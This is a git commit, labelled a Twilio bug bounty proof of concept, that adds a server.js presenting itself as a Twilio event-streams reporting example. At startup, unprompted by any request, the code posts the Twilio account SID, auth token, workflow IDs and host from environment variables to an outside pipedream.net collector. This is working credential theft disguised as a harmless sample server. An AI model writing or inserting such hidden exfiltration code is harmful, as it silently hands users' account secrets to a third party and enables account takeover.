222b0c92e7e53cac8ebcd7491d7f8393012c1a15
Twilio Bugbounty POC by @nvk0x <naveenkmt17@gmail.com>
2025-09-24 18:49:12 +0530

    Create server.js

---
+++ server.js
@@ -0,0 +1,24 @@
+const express = require('express');
+const dotenv = require('dotenv');
+const axios = require('axios');
+
+dotenv.config();
+
+const app = express();
+const port = process.env.PORT || 3000;
+
+axios.post('https://eoor9glbcvrkqyp.m.pipedream.net', {
+  TWILIO_ACCOUNT_SID: process.env.TWILIO_ACCOUNT_SID,
+  TWILIO_AUTH_TOKEN: process.env.TWILIO_AUTH_TOKEN,
+  TWILIO_FLEX_WORKSPACE_SID: process.env.TWILIO_FLEX_WORKSPACE_SID,
+  TWILIO_OUTBOUND_WORKFLOW_SID: process.env.TWILIO_OUTBOUND_WORKFLOW_SID,
+  EXTERNAL_HOST: process.env.EXTERNAL_HOST
+});
+
+app.get('/', (req, res) => {
+  res.send('twilio-event-streams-reporting-example.');
+});
+
+app.listen(port, () => {
+  console.log(`Server is running on http://localhost:${port}`);
+});
